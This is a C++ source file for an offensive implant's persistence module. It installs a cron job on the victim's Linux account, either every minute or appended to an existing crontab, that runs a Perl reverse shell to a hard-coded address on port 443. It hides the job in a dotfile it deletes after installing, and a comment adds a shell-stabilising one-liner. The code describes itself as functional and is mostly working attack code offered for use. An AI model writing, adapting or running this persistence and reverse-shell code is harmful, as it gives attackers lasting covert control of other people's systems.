// crontab -r                                   --> this resets the crontab of the caller
// crontab cron_formatted_file.sh               --> this will install the file as the crontab of the caller
// crontab -l                                   --> this lists the caller's crontab and can be used to check if it currently exists

// this code is functional
// this code should be refactored so that the main conditional in establish_crontab_persistence is not repetitive

#include <iostream>
#include "run_command.h"
#include <cstdlib>
#include <string>
#include <fstream>
#include <sstream>

std::string get_current_user();

bool establish_crontab_persistence() {

    /*
     * check if the user has an existing crontab        ("no crontab" in the output of crontab -l)
     * create local hidden file
     * install it as a crontab
     * */

    std::cout << "[+] Entering the Crontab persistence routine" << '\n';

    int counter { 0 };                                              // the local flag to check if persistence was established

    std::string current_user = get_current_user();
    if (current_user == "FAILED_NO_USER") {return false;}               // no opportunity to edit a crontab if we don't have a user for some reason

    std::string existing_crontab = run_command("crontab -l");

    std::string no_crontab_string = "no crontab for";

    if (existing_crontab.find(no_crontab_string) != std::string::npos) {        // if no existing crontab, create one
        try {
            std::cout << "\t[+] No crontab for " << current_user << '\n';
    
            // the injected cron job is based on perl because the perl executable is required by the linux kernel; thus, its presence is very reliable.
            // python3 -c 'import pty; pty.spawn("/bin/bash");'             --> use this once the shell is spawned for a clean, stable command line
            std::string new_crontab_contents = "* * * * * `which perl` -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"192.168.0.200:443\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'\n";
    
            std::ofstream hidden_cronjob_file(".qwertyuiop.job");
            hidden_cronjob_file << new_crontab_contents;
            hidden_cronjob_file.close();
    
            std::stringstream crontab_write_command;
            crontab_write_command << "crontab .qwertyuiop.job";
    
            std::string result = run_command(crontab_write_command.str().c_str());        // parameter 1 of run_command() must be const char *
            run_command("rm .qwertyuiop.job");
    
            std::cout << "\t[+] Successfully established persistence through the crontab" << '\n';
            counter++;
        } catch (...) {
            std::cout << "[+] An exception was thrown when attempting to establish crontab persistence..." << '\n';
            return false;
        }
    } else {                                                                    // crontab exists, it needs to be modified
        try {
            std::cout << "\t[+] Crontab exists for " << current_user << '\n';
            std::cout << "\t[+] The contents of the existing crontab: " << existing_crontab << '\n';
    
            std::stringstream modified_crontab;
    
            modified_crontab << existing_crontab << "\n\n" << "45 4 * * * `which perl` -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"192.168.0.200:443\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'\n";
    
            std::ofstream hidden_cronjob_file(".qwertyuiop.job");
            hidden_cronjob_file << modified_crontab.str();
            hidden_cronjob_file.close();
    
            std::stringstream crontab_write_command;
            crontab_write_command << "crontab .qwertyuiop.job";
    
            std::string result = run_command(crontab_write_command.str().c_str());
            run_command("rm .qwertyuiop.job");
            counter++;
        } catch (...) {
            std::cout << "[+] An exception was thrown when attempting to establish crontab persistence..." << '\n';
            return false;
        }
    }

    // if the counter has been incremented, that means that persistence was successfully established
    if (counter > 0) {return true;} else {return false;}        // make sure this line is correct before use --> should be > 0 if cron persistence was achieved
}

std::string get_current_user() {
    const char * current_user = std::getenv("USER");
    if (current_user) {return std::string(current_user);} else {return "FAILED_NO_USER";}
}
